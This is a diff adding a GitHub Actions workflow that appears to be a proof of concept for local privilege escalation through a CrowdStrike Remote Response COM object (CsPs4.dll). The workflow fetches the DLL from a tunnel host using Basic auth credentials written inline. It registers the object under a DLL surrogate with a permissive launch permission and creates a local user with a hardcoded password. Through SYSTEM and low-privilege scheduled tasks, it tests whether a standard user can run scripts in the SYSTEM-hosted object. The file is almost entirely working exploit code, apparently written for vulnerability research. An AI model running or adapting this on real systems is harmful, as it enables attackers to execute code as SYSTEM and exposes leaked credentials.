@@ -1,0 +1,106 @@
+name: Exact current CsPs4 COM access proof
+on:
+  workflow_dispatch:
+jobs:
+  proof:
+    runs-on: windows-2022
+    timeout-minutes: 20
+    steps:
+      - name: Reproduce exact COM registration and test standard-user access
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $root='C:\CsPs4Proof'
+          New-Item -ItemType Directory -Path $root -Force | Out-Null
+          New-Item -ItemType Directory -Path 'C:\Program Files\CrowdStrike' -Force | Out-Null
+          $sec=ConvertTo-SecureString 'CsProbe-1787333400!' -AsPlainText -Force
+          if (-not (Get-LocalUser -Name csprobe -ErrorAction SilentlyContinue)) {
+            New-LocalUser -Name csprobe -Password $sec -PasswordNeverExpires -UserMayNotChangePassword | Out-Null
+          }
+          Invoke-WebRequest -UseBasicParsing -Uri 'https://bdqjk-2600-1f18-68f7-2200-4028-ef90-7375-e9ea.free.pinggy.net/CsPs4.dll' -Headers @{'X-Pinggy-No-Screen'='1'} -Authentication Basic -Credential (New-Object PSCredential('cs740',(ConvertTo-SecureString 'RrP9v8NwK2xQ' -AsPlainText -Force))) -OutFile 'C:\Program Files\CrowdStrike\CsPs4.dll'
+          $hash=(Get-FileHash 'C:\Program Files\CrowdStrike\CsPs4.dll' -Algorithm SHA256).Hash.ToLower()
+          if ($hash -ne 'b065d339d5dd46a8123a93eadd4716a59848f389a152bca764d73e856f2d29b1') { throw "Unexpected CsPs4 hash $hash" }
+          & icacls 'C:\Program Files\CrowdStrike\CsPs4.dll' /inheritance:r /grant:r 'SYSTEM:F' 'Administrators:R' | Out-File "$root\acl.txt"
+          $cls='{BD07DDB9-1C61-4DCE-9202-A2BA1757CDB2}'
+          $iid='{520F9CE3-86E0-491E-A6A3-8F304C78EB8B}'
+          $base="HKLM:\SOFTWARE\Classes"
+          New-Item "$base\Interface\$iid" -Force | Out-Null
+          Set-Item "$base\Interface\$iid" 'IRemoteResponse'
+          New-Item "$base\Interface\$iid\ProxyStubClsid32" -Force | Out-Null
+          Set-Item "$base\Interface\$iid\ProxyStubClsid32" '{00020420-0000-0000-C000-000000000046}'
+          New-Item "$base\AppID\$cls" -Force | Out-Null
+          Set-Item "$base\AppID\$cls" 'CrowdStrike.RemoteResponse4'
+          New-ItemProperty "$base\AppID\$cls" -Name DllSurrogate -Value '' -PropertyType String -Force | Out-Null
+          $hex='010004803000000040000000000000001400000002001c0001000000000014000b0000000101000000000005120000000102000000000005200000002002000001020000000000052000000020020000'
+          [byte[]]$lp=for($i=0;$i -lt $hex.Length;$i+=2){[Convert]::ToByte($hex.Substring($i,2),16)}
+          New-ItemProperty "$base\AppID\$cls" -Name LaunchPermission -Value $lp -PropertyType Binary -Force | Out-Null
+          New-Item "$base\CrowdStrike.RemoteResponse4" -Force | Out-Null
+          Set-Item "$base\CrowdStrike.RemoteResponse4" 'CrowdStrike.RemoteResponse.RemoteResponse4'
+          New-Item "$base\CrowdStrike.RemoteResponse4\CLSID" -Force | Out-Null
+          Set-Item "$base\CrowdStrike.RemoteResponse4\CLSID" $cls
+          New-Item "$base\CLSID\$cls" -Force | Out-Null
+          Set-Item "$base\CLSID\$cls" 'CrowdStrike.RemoteResponse.RemoteResponse4'
+          New-ItemProperty "$base\CLSID\$cls" -Name AppID -Value $cls -PropertyType String -Force | Out-Null
+          New-Item "$base\CLSID\$cls\Implemented Categories\{62C8FE65-4EBB-45e7-B440-6E39B2CDBF29}" -Force | Out-Null
+          $ip="$base\CLSID\$cls\InprocServer32"
+          New-Item $ip -Force | Out-Null
+          Set-Item $ip 'mscoree.dll'
+          New-ItemProperty $ip -Name Class -Value 'CrowdStrike.RemoteResponse.RemoteResponse4' -PropertyType String -Force | Out-Null
+          New-ItemProperty $ip -Name Assembly -Value 'CsPs4, Version=7.40.21306.0, Culture=neutral, PublicKeyToken=02b60967b1f68187' -PropertyType String -Force | Out-Null
+          New-ItemProperty $ip -Name RuntimeVersion -Value 'v4.0.30319' -PropertyType String -Force | Out-Null
+          New-ItemProperty $ip -Name CodeBase -Value 'file:///C:/Program Files/CrowdStrike/CsPs4.dll' -PropertyType String -Force | Out-Null
+          New-ItemProperty $ip -Name ThreadingModel -Value 'Both' -PropertyType String -Force | Out-Null
+          $ver="$ip\7.40.21306.0"
+          New-Item $ver -Force | Out-Null
+          New-ItemProperty $ver -Name Class -Value 'CrowdStrike.RemoteResponse.RemoteResponse4' -PropertyType String -Force | Out-Null
+          New-ItemProperty $ver -Name Assembly -Value 'CsPs4, Version=7.40.21306.0, Culture=neutral, PublicKeyToken=02b60967b1f68187' -PropertyType String -Force | Out-Null
+          New-ItemProperty $ver -Name RuntimeVersion -Value 'v4.0.30319' -PropertyType String -Force | Out-Null
+          New-ItemProperty $ver -Name CodeBase -Value 'file:///C:/Program Files/CrowdStrike/CsPs4.dll' -PropertyType String -Force | Out-Null
+          New-Item "$base\CLSID\$cls\ProgID" -Force | Out-Null
+          Set-Item "$base\CLSID\$cls\ProgID" 'CrowdStrike.RemoteResponse4'
+          @'
+          $ErrorActionPreference='Stop'
+          try {
+            $dll='C:\Program Files\CrowdStrike\CsPs4.dll'
+            [void][Reflection.Assembly]::LoadFrom($dll)
+            $t=[Type]::GetTypeFromCLSID([Guid]'BD07DDB9-1C61-4DCE-9202-A2BA1757CDB2')
+            $raw=[Activator]::CreateInstance($t)
+            $o=[CrowdStrike.RemoteResponse.IRemoteResponse]$raw
+            $pidOut=$o.GetCurrentProcessId()
+            "SYSTEM_HOLDER caller=$([Security.Principal.WindowsIdentity]::GetCurrent().Name) surrogatePid=$pidOut" | Set-Content 'C:\CsPs4Proof\holder.txt'
+            Start-Sleep -Seconds 240
+          } catch { $_.Exception.ToString() | Set-Content 'C:\CsPs4Proof\holder-error.txt'; throw }
+          '@ | Set-Content "$root\holder.ps1"
+          @'
+          $ErrorActionPreference='Stop'
+          try {
+            $o=New-Object -ComObject CrowdStrike.RemoteResponse4
+            $pidOut=$o.GetCurrentProcessId()
+            [string]$exc=$null
+            $ok=$o.InvokeScript('[Security.Principal.WindowsIdentity]::GetCurrent().Name',[string[]]@('C:\'),[ref]$exc)
+            [string]$stdout=$null;[string]$stderr=$null;[string]$pollExc=$null
+            $poll=$o.PollResults(10000,[ref]$stdout,[ref]$stderr,[ref]$pollExc)
+            [pscustomobject]@{caller=[Security.Principal.WindowsIdentity]::GetCurrent().Name;activation='success';surrogatePid=$pidOut;invoke=$ok;poll=$poll;stdout=$stdout;stderr=$stderr;exception=$exc;pollException=$pollExc} | ConvertTo-Json -Compress | Set-Content 'C:\CsPs4Proof\probe.json'
+          } catch {
+            [pscustomobject]@{caller=[Security.Principal.WindowsIdentity]::GetCurrent().Name;activation='denied_or_error';hresult=('0x{0:X8}' -f ($_.Exception.HResult -band 0xffffffff));error=$_.Exception.ToString()} | ConvertTo-Json -Compress | Set-Content 'C:\CsPs4Proof\probe.json'
+          }
+          '@ | Set-Content "$root\probe.ps1"
+          schtasks /Create /F /TN CsPs4SystemHolder /SC ONCE /ST 23:59 /RU SYSTEM /RL HIGHEST /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\CsPs4Proof\holder.ps1" | Out-File "$root\schtasks-create-holder.txt"
+          schtasks /Run /TN CsPs4SystemHolder | Out-File "$root\schtasks-run-holder.txt"
+          for($i=0;$i -lt 60 -and -not (Test-Path "$root\holder.txt") -and -not (Test-Path "$root\holder-error.txt");$i++){Start-Sleep 1}
+          if(Test-Path "$root\holder-error.txt"){throw (Get-Content "$root\holder-error.txt" -Raw)}
+          if(-not (Test-Path "$root\holder.txt")){throw 'SYSTEM holder did not start'}
+          schtasks /Create /F /TN CsPs4UserProbe /SC ONCE /ST 23:59 /RU "$env:COMPUTERNAME\csprobe" /RP 'CsProbe-1787333400!' /RL LIMITED /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\CsPs4Proof\probe.ps1" | Out-File "$root\schtasks-create-probe.txt"
+          schtasks /Run /TN CsPs4UserProbe | Out-File "$root\schtasks-run-probe.txt"
+          for($i=0;$i -lt 60 -and -not (Test-Path "$root\probe.json");$i++){Start-Sleep 1}
+          if(-not (Test-Path "$root\probe.json")){throw 'User probe produced no output'}
+          Get-Content "$root\holder.txt"
+          Get-Content "$root\probe.json"
+          Get-Process dllhost -ErrorAction SilentlyContinue | Select-Object Id,ProcessName,Path,SessionId | ConvertTo-Json | Set-Content "$root\dllhost.json"
+          Get-Acl "$base\AppID\$cls" | Format-List * | Out-File "$root\appid-acl.txt"
+          Get-ItemProperty "$base\AppID\$cls" | Format-List * | Out-File "$root\appid-values.txt"
+      - name: Upload harmless proof
+        uses: actions/upload-artifact@v4
+        with:
+          name: csps4-proof
+          path: C:\CsPs4Proof
